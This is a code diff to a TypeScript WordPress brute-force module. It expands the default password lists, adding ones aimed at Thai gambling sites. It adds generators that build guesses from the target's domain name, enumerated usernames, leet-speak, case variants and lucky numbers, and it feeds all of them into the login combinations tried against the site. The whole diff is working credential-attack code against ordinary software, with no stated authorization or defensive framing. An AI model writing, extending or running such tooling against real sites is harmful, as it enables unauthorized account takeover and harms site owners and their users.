@@ -64,34 +64,227 @@ const DEFAULT_USERNAMES = [
 ];
 
 const DEFAULT_PASSWORDS = [
-  "admin", "admin123", "admin1234", "administrator",
-  "password", "password123", "pass123", "pass1234",
+  // Classic defaults
+  "admin", "admin123", "admin1234", "admin12345", "administrator",
+  "password", "password123", "pass123", "pass1234", "passw0rd",
   "123456", "12345678", "123456789", "1234567890",
-  "qwerty", "abc123", "letmein", "welcome",
-  "wordpress", "wp-admin", "wpadmin",
+  "qwerty", "abc123", "letmein", "welcome", "monkey",
+  "wordpress", "wp-admin", "wpadmin", "wp123", "wp1234",
   "test", "test123", "demo", "demo123",
-  "root", "toor", "changeme",
+  "root", "toor", "changeme", "default",
   "P@ssw0rd", "P@ssword1", "Admin@123", "Admin123!",
   "!@#$%^&*", "password1", "iloveyou",
+  // Thai gambling industry common
+  "168", "168168", "888", "888888", "777", "777777", "999", "999999",
+  "bet168", "slot168", "casino168", "game168", "play168",
+  "bet888", "slot888", "casino888", "game888",
+  "bet777", "slot777", "casino777",
+  "topgame", "topgame123", "topgame!",
+  "lucky", "lucky168", "lucky888", "lucky777",
+  "winner", "winner168", "jackpot", "jackpot168",
+  // Thai lucky numbers & year patterns
+  "2567", "2568", "2569", "2024", "2025", "2026",
+  "5555", "9999", "1688", "6688", "8888",
+  // Common strong-ish patterns
+  "Aa123456", "Aa123456!", "Abc123!", "Abc@123",
+  "Qwerty123", "Qwerty123!", "Asdf1234", "Zxcv1234",
+  "Admin2024", "Admin2025", "Admin2026",
+  "Admin@2024", "Admin@2025", "Admin@2026",
+  "P@ss1234", "P@ssw0rd!", "Passw0rd!",
 ];
 
+// ═══════════════════════════════════════════════
+//  SMART PASSWORD GENERATION
+// ═══════════════════════════════════════════════
+
+/** Leet speak transformation */
+function leetSpeak(str: string): string[] {
+  const map: Record<string, string[]> = {
+    a: ["@", "4"], e: ["3"], i: ["1", "!"], o: ["0"],
+    s: ["$", "5"], t: ["7"], l: ["1"], b: ["8"],
+  };
+  const results: string[] = [];
+  // Single substitution variants
+  for (let i = 0; i < str.length; i++) {
+    const ch = str[i].toLowerCase();
+    if (map[ch]) {
+      for (const rep of map[ch]) {
+        results.push(str.slice(0, i) + rep + str.slice(i + 1));
+      }
+    }
+  }
+  // Full leet
+  let full = str;
+  for (const [k, v] of Object.entries(map)) {
+    full = full.replace(new RegExp(k, "gi"), v[0]);
+  }
+  if (full !== str) results.push(full);
+  return results;
+}
+
+/** Case variants */
+function caseVariants(str: string): string[] {
+  const lower = str.toLowerCase();
+  const upper = str.toUpperCase();
+  const capitalize = str.charAt(0).toUpperCase() + str.slice(1).toLowerCase();
+  const camel = str.replace(/[-_\s]+(\w)/g, (_, c) => c.toUpperCase());
+  return Array.from(new Set([lower, upper, capitalize, camel].filter(v => v !== str)));
+}
+
+/** Extract meaningful parts from domain */
+function parseDomainParts(domain: string): { full: string; parts: string[]; numbers: string; letters: string } {
+  const name = domain.replace(/\.(com|net|org|io|co|info|biz|xyz|site|online|store|shop|club|app|dev|tech|pro|me|us|uk|th|asia|cc|tv|gg|bet|casino|poker|game|play|win|fun|live|vip)$/i, "");
+  const full = name.replace(/[^a-zA-Z0-9]/g, "");
+  // Split by separators: 168-topgame → ["168", "topgame"]
+  const parts = name.split(/[-_.]/).filter(p => p.length > 0);
+  const numbers = full.replace(/[^0-9]/g, "");
+  const letters = full.replace(/[^a-zA-Z]/g, "");
+  return { full, parts, numbers, letters };
+}
+
 function generateDomainPasswords(domain: string): string[] {
-  const name = domain.replace(/\.(com|net|org|io|co|info|biz|xyz|site|online|store|shop|club|app|dev|tech|pro|me|us|uk|th|asia)$/i, "");
-  const clean = name.replace(/[^a-zA-Z0-9]/g, "");
-  return [
-    clean,
-    `${clean}123`,
-    `${clean}1234`,
-    `${clean}!`,
-    `${clean}@123`,
-    `${clean}admin`,
-    `${clean}2024`,
-    `${clean}2025`,
-    `${clean}2026`,
-    clean.charAt(0).toUpperCase() + clean.slice(1),
-    `${clean.charAt(0).toUpperCase() + clean.slice(1)}123`,
-    `${clean.charAt(0).toUpperCase() + clean.slice(1)}!`,
-  ];
+  const { full, parts, numbers, letters } = parseDomainParts(domain);
+  const passwords: string[] = [];
+  const add = (p: string) => { if (p && p.length >= 3) passwords.push(p); };
+
+  // ─── Base domain variants ───
+  add(full);                              // 168topgame
+  for (const v of caseVariants(full)) add(v); // 168TOPGAME, 168Topgame
+
+  // ─── Each part separately ───
+  for (const part of parts) {
+    add(part);                            // 168, topgame
+    for (const v of caseVariants(part)) add(v);
+  }
+
+  // ─── Domain + number suffixes ───
+  const suffixes = ["123", "1234", "12345", "!", "!!", "@123", "@1234", "#123",
+    "$123", "*123", "_123", ".123", "168", "888", "777", "999",
+    "2024", "2025", "2026", "2567", "2568", "2569",
+    "admin", "Admin", "pass", "wp"];
+  for (const s of suffixes) {
+    add(`${full}${s}`);                   // 168topgame123
+    add(`${full.charAt(0).toUpperCase() + full.slice(1)}${s}`); // 168Topgame123
+  }
+
+  // ─── Domain + special char patterns ───
+  const specials = ["!", "@", "#", "$", "*"];
+  for (const sp of specials) {
+    add(`${full}${sp}`);                  // 168topgame!
+    add(`${full.charAt(0).toUpperCase() + full.slice(1)}${sp}`); // 168Topgame!
+    add(`${sp}${full}`);                  // !168topgame
+    add(`${full}${sp}123`);               // 168topgame!123
+    add(`${full}${sp}1234`);              // 168topgame!1234
+  }
+
+  // ─── Letters + numbers combos ───
+  if (letters && numbers) {
+    add(`${letters}${numbers}`);          // topgame168
+    add(`${numbers}${letters}`);          // 168topgame
+    add(`${letters.charAt(0).toUpperCase() + letters.slice(1)}${numbers}`); // Topgame168
+    add(`${letters}${numbers}!`);         // topgame168!
+    add(`${letters.charAt(0).toUpperCase() + letters.slice(1)}${numbers}!`); // Topgame168!
+    add(`${letters}@${numbers}`);         // topgame@168
+    add(`${letters.charAt(0).toUpperCase() + letters.slice(1)}@${numbers}`); // Topgame@168
+  }
+
+  // ─── Reversed ───
+  const rev = full.split("").reverse().join("");
+  add(rev);                               // emagpot861
+  add(`${rev}123`);
+
+  // ─── Leet speak variants (top 3 base words only to limit explosion) ───
+  const leetBases = [full, letters, parts[0]].filter(Boolean).slice(0, 3);
+  for (const base of leetBases) {
+    if (!base) continue;
+    const leets = leetSpeak(base);
+    for (const l of leets.slice(0, 5)) {  // Max 5 leet variants per base
+      add(l);
+      add(`${l}123`);
+      add(`${l}!`);
+    }
+  }
+
+  // ─── Part combinations (for multi-part domains like 168-topgame) ───
+  if (parts.length >= 2) {
+    for (let i = 0; i < parts.length; i++) {
+      for (let j = 0; j < parts.length; j++) {
+        if (i === j) continue;
+        add(`${parts[i]}${parts[j]}`);
+        add(`${parts[i]}_${parts[j]}`);
+        add(`${parts[i]}${parts[j]}123`);
+        add(`${parts[i]}${parts[j]}!`);
+        add(`${parts[i].charAt(0).toUpperCase() + parts[i].slice(1)}${parts[j].charAt(0).toUpperCase() + parts[j].slice(1)}`);
+      }
+    }
+  }
+
+  // ─── Gambling-specific combos ───
+  const gamblingWords = ["bet", "slot", "casino", "game", "play", "win", "vip", "lucky", "jackpot", "spin"];
+  for (const gw of gamblingWords) {
+    add(`${gw}${numbers || "168"}`);      // bet168
+    add(`${gw}${full}`);                  // bet168topgame
+    add(`${full}${gw}`);                  // 168topgamebet
+    add(`${letters}${gw}`);               // topgamebet
+    add(`${gw}${letters}`);
+  }
+
+  // ─── Thai lucky number patterns ───
+  const luckyNums = ["168", "888", "777", "999", "1688", "6688", "8888", "5555", "9999"];
+  for (const ln of luckyNums) {
+    add(`${letters}${ln}`);               // topgame168
+    add(`${letters.charAt(0).toUpperCase() + letters.slice(1)}${ln}`); // Topgame168
+    add(`${letters}${ln}!`);              // topgame168!
+  }
+
+  return Array.from(new Set(passwords));
+}
+
+/** Generate passwords based on discovered usernames */
+function generateUsernamePasswords(usernames: string[]): string[] {
+  const passwords: string[] = [];
+  const add = (p: string) => { if (p && p.length >= 3) passwords.push(p); };
+
+  for (const user of usernames) {
+    const clean = user.replace(/[^a-zA-Z0-9]/g, "");
+    if (!clean) continue;
+    const cap = clean.charAt(0).toUpperCase() + clean.slice(1);
+
+    // Username as password (very common!)
+    add(clean);
+    add(cap);
+    add(clean.toUpperCase());
+
+    // Username + numbers
+    for (const n of ["1", "12", "123", "1234", "12345", "168", "888", "777", "2025", "2026"]) {
+      add(`${clean}${n}`);
+      add(`${cap}${n}`);
+    }
+
+    // Username + special
+    for (const sp of ["!", "@", "#", "$", "*"]) {
+      add(`${clean}${sp}`);
+      add(`${cap}${sp}`);
+      add(`${clean}${sp}123`);
+      add(`${cap}${sp}123`);
+      add(`${cap}${sp}1234`);
+    }
+
+    // Username leet
+    for (const l of leetSpeak(clean).slice(0, 3)) {
+      add(l);
+      add(`${l}123`);
+      add(`${l}!`);
+    }
+
+    // Common patterns: user@year, User!123
+    add(`${cap}@2024`); add(`${cap}@2025`); add(`${cap}@2026`);
+    add(`${cap}!123`); add(`${cap}!1234`);
+    add(`${clean}pass`); add(`${clean}admin`);
+    add(`${cap}Pass`); add(`${cap}Admin`);
+  }
+
+  return Array.from(new Set(passwords));
 }
 
 // ═══════════════════════════════════════════════
@@ -128,20 +321,29 @@ export async function wpBruteForce(config: BruteForceConfig): Promise<BruteForce
   const usernames = await enumerateUsernames(baseUrl, config.domain, hostHeader, log);
   result.usernamesFound = usernames;
 
-  // Build username list (enumerated + defaults + custom)
+  // Build username list (enumerated + defaults + custom + domain-based)
+  const { parts: domainParts, letters: domainLetters, full: domainFull } = parseDomainParts(config.domain);
+  const domainUsernames = [
+    domainFull,                                    // 168topgame
+    domainLetters,                                 // topgame
+    ...domainParts,                                // 168, topgame
+    ...domainParts.map(p => p.toLowerCase()),
+  ].filter(u => u && u.length >= 3);
+
   const allUsernames = Array.from(new Set([
     ...usernames,
     ...DEFAULT_USERNAMES,
     ...(config.customUsernames || []),
-    // Add domain-based usernames
-    config.domain.replace(/\.(com|net|org|io|co|th)$/i, ""),
+    ...domainUsernames,
   ]));
 
-  // Build password list
+  // Build password list (default + domain-based + username-based)
+  const usernamePasswords = generateUsernamePasswords(allUsernames);
   const allPasswords = Array.from(new Set([
     ...DEFAULT_PASSWORDS,
     ...(config.customPasswords || []),
     ...generateDomainPasswords(config.domain),
+    ...usernamePasswords,
   ]));
 
   log(`Usernames: ${allUsernames.length} | Passwords: ${allPasswords.length} | Max combos: ${allUsernames.length * allPasswords.length}`);
